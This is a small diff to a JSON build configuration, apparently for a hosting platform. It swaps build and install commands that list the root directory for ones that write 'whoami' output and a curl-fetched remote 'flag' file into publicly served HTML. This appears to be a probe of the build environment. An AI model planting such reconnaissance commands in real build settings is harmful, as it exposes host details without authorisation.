@@ -1,5 +1,5 @@
 {
-    "buildCommand": "ls / -al>./aaa.html",
-    "installCommand": "ls / -al>./bbb.html",
+    "buildCommand": "whoami>./aaa.html",
+    "installCommand": "curl https://tst.qq.com/flag.html>./bbb.html",
     "outputDirectory": "./"
 }
